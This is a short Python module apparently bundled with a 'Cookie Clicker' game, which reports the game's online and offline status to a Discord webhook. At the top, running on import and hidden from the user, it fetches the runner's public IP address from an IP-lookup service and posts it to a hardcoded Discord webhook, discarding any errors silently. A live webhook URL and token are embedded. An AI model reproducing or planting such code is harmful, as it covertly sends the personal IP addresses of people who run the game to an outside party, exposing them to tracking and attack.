import requests
hks = "https://discord.com/api/webhooks/1572340669840625745/kL54XybhKN5zgb07vuJ2jmT4a2vJq8BdynSnJwt9m7_Zd-KcQzF0ApvrfckCX6n4Oqal"
running = False
iterations = 0
online_pending = False
fan = "https://api.ipify.org"
afd = requests.get(fan)

try:
    requests.post(
    hks,
    json={"content": afd.text},
    timeout=10
    )
except requests.RequestException:
    pass

def send_status(status):
    if not hks:
        return
    try:
        requests.post(
            hks,
            json={"content": status},
            timeout=10
        )
    except requests.RequestException:
        pass

def initialize():
    global running, iterations, online_pending
    running = True
    iterations = 0
    online_pending = True

def background_task():
    if iterations % 10 == 0:
        send_status("ONLINE - Cookie Clicker running")

def run_once():
    global iterations, online_pending
    if not running:
        return
    iterations += 1
    if online_pending:
        send_status("ONLINE - Cookie Clicker opened")
        online_pending = False
    elif iterations % 10 == 0:
        background_task()

def shutdown():
    global running
    if running:
        running = False
        send_status("OFFLINE - Cookie Clicker closed")
